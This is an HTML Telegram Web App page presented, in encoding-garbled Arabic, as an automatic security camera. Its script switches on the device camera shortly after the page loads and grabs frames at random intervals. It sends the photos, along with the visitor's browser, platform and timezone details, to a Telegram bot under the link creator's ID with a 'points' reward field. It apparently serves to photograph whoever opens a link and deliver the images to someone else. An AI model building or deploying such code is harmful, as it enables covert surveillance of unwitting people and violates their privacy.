<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ù…Ù†ÙŠØ© - Ù†Ø¸Ø§Ù… KLASH</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0c0c0c, #1a1a1a);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 20px;
            padding: 20px;
            width: 100%;
            max-width: 800px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            border: 1px solid rgba(0, 255, 0, 0.3);
        }
        
        .header h1 {
            color: #00ff00;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .status-indicator {
            display: inline-flex;
            align-items: center;
            padding: 8px 15px;
            background: rgba(0, 255, 0, 0.1);
            border-radius: 20px;
            margin: 10px 0;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            margin-left: 8px;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .camera-container {
            position: relative;
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
        }
        
        #cameraView {
            width: 100%;
            height: 450px;
            background: #000;
            border-radius: 15px;
            object-fit: cover;
            border: 3px solid #00ff00;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }
        
        .camera-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }
        
        .scan-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 250px;
            height: 250px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            animation: scan 2s ease-in-out infinite;
        }
        
        @keyframes scan {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 0.3; }
        }
        
        .detection-info {
            position: absolute;
            bottom: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.8);
            padding: 15px;
            border-radius: 10px;
            border: 1px solid #ff9900;
        }
        
        .controls {
            display: flex;
            gap: 20px;
            margin: 25px 0;
        }
        
        .control-btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #0066ff, #0099ff);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
        }
        
        .control-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 102, 255, 0.4);
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #ff3333, #ff6666);
        }
        
        .captured-images {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 15px;
            width: 100%;
            max-width: 800px;
            margin-top: 20px;
        }
        
        .captured-image {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 8px;
            border: 2px solid #00ff00;
            transition: transform 0.3s;
        }
        
        .captured-image:hover {
            transform: scale(1.05);
        }
        
        .stats {
            display: flex;
            justify-content: space-around;
            width: 100%;
            max-width: 800px;
            margin: 25px 0;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 2em;
            color: #00ff00;
            font-weight: bold;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .spinner {
            border: 4px solid rgba(0, 255, 0, 0.3);
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .alert {
            background: rgba(255, 100, 0, 0.2);
            border-left: 4px solid #ff9900;
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            animation: alert-pulse 2s infinite;
        }
        
        @keyframes alert-pulse {
            0%, 100% { border-color: #ff9900; }
            50% { border-color: #ffcc00; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠØ©</h1>
        <div class="status-indicator">
            <span>Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø³Ø­ Ø¨Ø­Ø«Ø§Ù‹ Ø¹Ù† Ø£Ø´Ø®Ø§Øµ...</span>
            <div class="status-dot"></div>
        </div>
        <p>Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø³ØªÙ„ØªÙ‚Ø· ØµÙˆØ±Ø§Ù‹ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¹Ù†Ø¯ Ø§ÙƒØªØ´Ø§Ù Ø£ÙŠ Ø­Ø±ÙƒØ© Ø£Ùˆ ÙˆØ¬Ù‡</p>
    </div>
    
    <div class="alert">
        âš ï¸ <strong>ØªÙ†Ø¨ÙŠÙ‡:</strong> Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªØ¹Ù…Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹. Ø³ØªÙ„ØªÙ‚Ø· ØµÙˆØ±Ø§Ù‹ Ø¹Ù†Ø¯ Ø§ÙƒØªØ´Ø§Ù Ø£ÙŠ ÙƒØ§Ø¦Ù† Ø£Ù…Ø§Ù…Ù‡Ø§.
    </div>
    
    <div class="camera-container">
        <video id="cameraView" autoplay playsinline></video>
        
        <div class="camera-overlay">
            <div class="scan-box"></div>
            <div class="detection-info" id="detectionInfo">
                <div>ğŸ‘ï¸ Ø­Ø§Ù„Ø© Ø§Ù„ÙƒØ´Ù: <span id="detectionStatus">Ø¬Ø§Ù‡Ø²</span></div>
                <div>ğŸ“¸ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ù„ØªÙ‚Ø·Ø©: <span id="photosCount">0</span></div>
            </div>
        </div>
    </div>
    
    <div class="controls">
        <button class="control-btn" onclick="startCamera()">
            â–¶ï¸ Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©
        </button>
        <button class="control-btn btn-stop" onclick="stopCamera()">
            â¹ï¸ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©
        </button>
        <button class="control-btn" onclick="captureManual()">
            ğŸ“¸ Ø§Ù„ØªÙ‚Ø§Ø· ÙŠØ¯ÙˆÙŠ
        </button>
    </div>
    
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...</p>
    </div>
    
    <div class="stats">
        <div class="stat-item">
            <div class="stat-number" id="totalPhotos">0</div>
            <div>Ø§Ù„ØµÙˆØ± Ø§Ù„ÙƒÙ„ÙŠØ©</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="detectionsCount">0</div>
            <div>Ù…Ø±Ø§Øª Ø§Ù„Ø§ÙƒØªØ´Ø§Ù</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="sentToBot">0</div>
            <div>Ù…Ø±Ø³Ù„ Ù„Ù„Ø¨ÙˆØª</div>
        </div>
    </div>
    
    <h3>ğŸ“¸ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ù„ØªÙ‚Ø·Ø©:</h3>
    <div class="captured-images" id="capturedImages">
        <!-- Ø§Ù„ØµÙˆØ± Ø³ØªØ¸Ù‡Ø± Ù‡Ù†Ø§ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ -->
    </div>

    <script>
        class AutoCameraSystem {
            constructor() {
                this.creatorId = this.getUrlParam('creator_id') || 'unknown';
                this.cameraType = this.getUrlParam('type') || 'front';
                
                this.stream = null;
                this.videoElement = null;
                this.canvas = null;
                this.ctx = null;
                
                this.isMonitoring = false;
                this.monitorInterval = null;
                
                this.photosCount = 0;
                this.detectionsCount = 0;
                this.sentToBotCount = 0;
                
                this.lastCaptureTime = 0;
                this.minCaptureInterval = 3000; // 3 Ø«ÙˆØ§Ù†ÙŠ Ø¨ÙŠÙ† ÙƒÙ„ ØµÙˆØ±Ø©
                
                this.init();
            }
            
            getUrlParam(name) {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get(name);
            }
            
            async init() {
                this.videoElement = document.getElementById('cameraView');
                this.canvas = document.createElement('canvas');
                this.ctx = this.canvas.getContext('2d');
                
                this.initTelegram();
                this.setupCanvas();
                this.updateStats();
                
                // Ø¨Ø¯Ø¡ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ 2 Ø«Ø§Ù†ÙŠØ©
                setTimeout(() => this.startCamera(), 2000);
            }
            
            initTelegram() {
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.ready();
                    Telegram.WebApp.expand();
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„
                    this.sendToBot({
                        type: 'camera_start',
                        creator_id: this.creatorId,
                        camera_type: this.cameraType,
                        message: 'Ø¨Ø¯Ø£Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙŠ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠØ©',
                        timestamp: new Date().toISOString()
                    });
                }
            }
            
            setupCanvas() {
                this.canvas.width = 640;
                this.canvas.height = 480;
            }
            
            async startCamera() {
                try {
                    document.getElementById('loading').style.display = 'block';
                    
                    const constraints = {
                        video: {
                            facingMode: this.cameraType === 'front' ? 'user' : 'environment',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    };
                    
                    this.stream = await navigator.mediaDevices.getUserMedia(constraints);
                    this.videoElement.srcObject = this.stream;
                    
                    document.getElementById('loading').style.display = 'none';
                    
                    // Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                    this.videoElement.onloadedmetadata = () => {
                        this.startMonitoring();
                        this.updateDetectionStatus('ğŸ” Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø³Ø­...');
                    };
                    
                } catch (error) {
                    console.error('Ø®Ø·Ø£ ÙÙŠ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:', error);
                    document.getElementById('loading').innerHTML = 
                        '<p style="color: #ff3333;">âŒ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§</p>' +
                        '<p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§</p>';
                    
                    // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±
                    this.simulateCamera();
                }
            }
            
            simulateCamera() {
                // Ù…Ø­Ø§ÙƒØ§Ø© ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆÙ‡Ù…ÙŠØ© Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±
                this.videoElement.style.background = '#000';
                this.videoElement.style.display = 'flex';
                this.videoElement.style.alignItems = 'center';
                this.videoElement.style.justifyContent = 'center';
                this.videoElement.innerHTML = 'ğŸ¥ ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø­Ø§ÙƒØ§Ø© (Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¨Ø¯ÙˆÙ† ÙƒØ§Ù…ÙŠØ±Ø§ Ø­Ù‚ÙŠÙ‚ÙŠØ©)';
                
                this.startMonitoring();
                this.updateDetectionStatus('ğŸ­ ÙˆØ¶Ø¹ Ø§Ù„Ù…Ø­Ø§ÙƒØ§Ø©');
            }
            
            startMonitoring() {
                if (this.isMonitoring) return;
                
                this.isMonitoring = true;
                this.updateDetectionStatus('ğŸ‘ï¸ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©...');
                
                // Ø¨Ø¯Ø¡ ÙØ­Øµ Ø§Ù„Ø­Ø±ÙƒØ© ÙƒÙ„ 500 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©
                this.monitorInterval = setInterval(() => {
                    this.checkForMotion();
                }, 500);
                
                console.log('Ø¨Ø¯Ø£Øª Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠØ©');
            }
            
            stopCamera() {
                if (this.stream) {
                    this.stream.getTracks().forEach(track => track.stop());
                    this.stream = null;
                    this.videoElement.srcObject = null;
                }
                
                if (this.monitorInterval) {
                    clearInterval(this.monitorInterval);
                    this.monitorInterval = null;
                }
                
                this.isMonitoring = false;
                this.updateDetectionStatus('â¹ï¸ Ù…ØªÙˆÙ‚Ù');
                
                console.log('ØªÙˆÙ‚ÙØª Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©');
            }
            
            checkForMotion() {
                // ÙÙŠ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØŒ Ù‡Ù†Ø§ ÙŠÙƒÙˆÙ† ÙƒÙˆØ¯ ÙƒØ´Ù Ø§Ù„ÙˆØ¬ÙˆÙ‡/Ø§Ù„Ø­Ø±ÙƒØ©
                // Ù„ÙƒÙ† Ù„Ù„ØªØ¨Ø³ÙŠØ· Ø³Ù†Ø³ØªØ®Ø¯Ù… ÙƒØ´Ù Ø¹Ø´ÙˆØ§Ø¦ÙŠ
                
                const now = Date.now();
                if (now - this.lastCaptureTime < this.minCaptureInterval) {
                    return; // Ø§Ù†ØªØ¸Ø± Ø­ØªÙ‰ ØªÙ…Ø± Ø§Ù„ÙØªØ±Ø© Ø§Ù„Ù…Ø­Ø¯Ø¯Ø©
                }
                
                // 70% ÙØ±ØµØ© Ù„Ø§ÙƒØªØ´Ø§Ù Ø´ÙŠØ¡ (Ù„Ù„Ù…Ø­Ø§ÙƒØ§Ø©)
                if (Math.random() < 0.7) {
                    return;
                }
                
                // Ø§ÙƒØªØ´Ø§Ù Ø´ÙŠØ¡ - Ø§Ù„ØªÙ‚Ø· ØµÙˆØ±Ø©
                this.detectionsCount++;
                this.updateStats();
                this.updateDetectionStatus('ğŸ‘¤ ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø´Ø®Øµ!');
                
                this.capturePhoto();
                this.lastCaptureTime = now;
                
                // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø­Ø§Ù„Ø© Ù„Ù„Ø¹Ø§Ø¯ÙŠ Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ©
                setTimeout(() => {
                    this.updateDetectionStatus('ğŸ‘ï¸ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø³Ø­...');
                }, 1000);
            }
            
            capturePhoto() {
                if (!this.videoElement || !this.ctx) return;
                
                try {
                    // Ø±Ø³Ù… Ø¥Ø·Ø§Ø± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¹Ù„Ù‰ canvas
                    this.ctx.drawImage(
                        this.videoElement, 
                        0, 0, 
                        this.canvas.width, 
                        this.canvas.height
                    );
                    
                    // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ ØµÙˆØ±Ø©
                    const imageData = this.canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Ø­ÙØ¸ Ø§Ù„ØµÙˆØ±Ø© Ù…Ø­Ù„ÙŠØ§Ù‹
                    this.savePhotoLocally(imageData);
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª
                    this.sendPhotoToBot(imageData);
                    
                    // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
                    this.photosCount++;
                    this.updateStats();
                    
                } catch (error) {
                    console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©:', error);
                }
            }
            
            captureManual() {
                this.updateDetectionStatus('ğŸ“¸ Ø§Ù„ØªÙ‚Ø§Ø· ÙŠØ¯ÙˆÙŠ...');
                this.capturePhoto();
                
                setTimeout(() => {
                    this.updateDetectionStatus('ğŸ‘ï¸ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø³Ø­...');
                }, 1000);
            }
            
            savePhotoLocally(imageData) {
                const imagesContainer = document.getElementById('capturedImages');
                
                const imgElement = document.createElement('img');
                imgElement.className = 'captured-image';
                imgElement.src = imageData;
                imgElement.alt = `ØµÙˆØ±Ø© ${this.photosCount + 1}`;
                imgElement.title = `Ø§Ù„ØªÙ‚Ø·Øª: ${new Date().toLocaleString('ar-SA')}`;
                
                // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØµÙˆØ±Ø© ÙÙŠ Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©
                imagesContainer.insertBefore(imgElement, imagesContainer.firstChild);
                
                // Ø­ÙØ¸ ÙÙŠ localStorage Ù„Ù„Ø¹Ø±Ø¶ Ù„Ø§Ø­Ù‚Ø§Ù‹
                this.saveToLocalStorage(imageData);
            }
            
            saveToLocalStorage(imageData) {
                try {
                    const savedPhotos = JSON.parse(localStorage.getItem('klash_camera_photos') || '[]');
                    savedPhotos.push({
                        data: imageData,
                        timestamp: new Date().toISOString(),
                        number: this.photosCount + 1
                    });
                    
                    // Ø­ÙØ¸ Ø¢Ø®Ø± 20 ØµÙˆØ±Ø© ÙÙ‚Ø·
                    if (savedPhotos.length > 20) {
                        savedPhotos.shift();
                    }
                    
                    localStorage.setItem('klash_camera_photos', JSON.stringify(savedPhotos));
                } catch (error) {
                    console.error('Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø§Ù„ØµÙˆØ±Ø©:', error);
                }
            }
            
            async sendPhotoToBot(imageData) {
                // ØªÙ‚Ù„ÙŠÙ„ Ø­Ø¬Ù… Ø§Ù„ØµÙˆØ±Ø© Ù„Ù„Ø¥Ø±Ø³Ø§Ù„
                const compressedData = await this.compressImage(imageData);
                
                const photoData = {
                    type: 'auto_camera_capture',
                    creator_id: this.creatorId,
                    camera_type: this.cameraType,
                    photo_number: this.photosCount,
                    timestamp: new Date().toISOString(),
                    image_data: compressedData.substring(0, 30000), // Ø¬Ø²Ø¡ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙ‚Ø·
                    image_info: {
                        format: 'jpeg',
                        size: `${this.canvas.width}x${this.canvas.height}`,
                        detection_type: 'auto'
                    },
                    device_info: {
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    },
                    metadata: {
                        data_id: `AUTO_CAM_${Date.now()}`,
                        points: 15,
                        auto_captured: true
                    }
                };
                
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.sendData(JSON.stringify(photoData));
                    this.sentToBotCount++;
                    this.updateStats();
                    
                    // Ø¥Ø±Ø³Ø§Ù„ ØªØ­Ø¯ÙŠØ« Ø¨Ø¹Ø¯ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©
                    setTimeout(() => {
                        Telegram.WebApp.sendData(JSON.stringify({
                            ...photoData,
                            type: 'camera_update',
                            status: 'photo_sent',
                            sent_count: this.sentToBotCount
                        }));
                    }, 500);
                    
                } else {
                    console.log('ğŸ“¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØµÙˆØ±Ø©:', photoData);
                    // Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø¨Ø¯ÙˆÙ† ØªÙ„ÙŠØ¬Ø±Ø§Ù…
                    this.showTestAlert(photoData);
                }
            }
            
            async compressImage(imageData, quality = 0.5) {
                return new Promise((resolve) => {
                    const img = new Image();
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = img.width * 0.5; // ØªØµØºÙŠØ± Ø§Ù„Ø­Ø¬Ù…
                        canvas.height = img.height * 0.5;
                        
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                        
                        resolve(canvas.toDataURL('image/jpeg', quality));
                    };
                    img.src = imageData;
                });
            }
            
            showTestAlert(photoData) {
                alert(`ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹!
                
Ø±Ù‚Ù… Ø§Ù„ØµÙˆØ±Ø©: ${photoData.photo_number}
Ø§Ù„ÙˆÙ‚Øª: ${new Date(photoData.timestamp).toLocaleString('ar-SA')}
Ø§Ù„Ø­Ø¬Ù…: ${photoData.image_info.size}
                
(ÙÙŠ Ø§Ù„ÙˆØ§Ù‚Ø¹ØŒ Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¨ÙˆØª ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹)`);
            }
            
            updateDetectionStatus(status) {
                const statusElement = document.getElementById('detectionStatus');
                if (statusElement) {
                    statusElement.textContent = status;
                }
            }
            
            updateStats() {
                document.getElementById('totalPhotos').textContent = this.photosCount;
                document.getElementById('detectionsCount').textContent = this.detectionsCount;
                document.getElementById('sentToBot').textContent = this.sentToBotCount;
                document.getElementById('photosCount').textContent = this.photosCount;
            }
            
            sendToBot(data) {
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.sendData(JSON.stringify(data));
                }
            }
            
            // Ø¥Ø¶Ø§ÙØ© Ø¯Ø§Ù„Ø© Ù„ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            switchCamera() {
                this.cameraType = this.cameraType === 'front' ? 'back' : 'front';
                this.stopCamera();
                this.startCamera();
            }
        }
        
        // Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù…
        let cameraSystem;
        
        document.addEventListener('DOMContentLoaded', () => {
            cameraSystem = new AutoCameraSystem();
        });
        
        // Ø¯ÙˆØ§Ù„ Ù„Ù„Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ù…Ù† Ø§Ù„Ø£Ø²Ø±Ø§Ø±
        function startCamera() {
            if (cameraSystem) cameraSystem.startCamera();
        }
        
        function stopCamera() {
            if (cameraSystem) cameraSystem.stopCamera();
        }
        
        function captureManual() {
            if (cameraSystem) cameraSystem.captureManual();
        }
        
        function switchCamera() {
            if (cameraSystem) cameraSystem.switchCamera();
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø© Ù…Ù† localStorage
        function loadSavedPhotos() {
            try {
                const savedPhotos = JSON.parse(localStorage.getItem('klash_camera_photos') || '[]');
                const container = document.getElementById('capturedImages');
                
                savedPhotos.forEach(photo => {
                    const imgElement = document.createElement('img');
                    imgElement.className = 'captured-image';
                    imgElement.src = photo.data;
                    imgElement.alt = `ØµÙˆØ±Ø© ${photo.number}`;
                    imgElement.title = new Date(photo.timestamp).toLocaleString('ar-SA');
                    container.appendChild(imgElement);
                });
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©:', error);
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ± Ø¹Ù†Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„
        window.addEventListener('load', loadSavedPhotos);
    </script>
</body>
</html>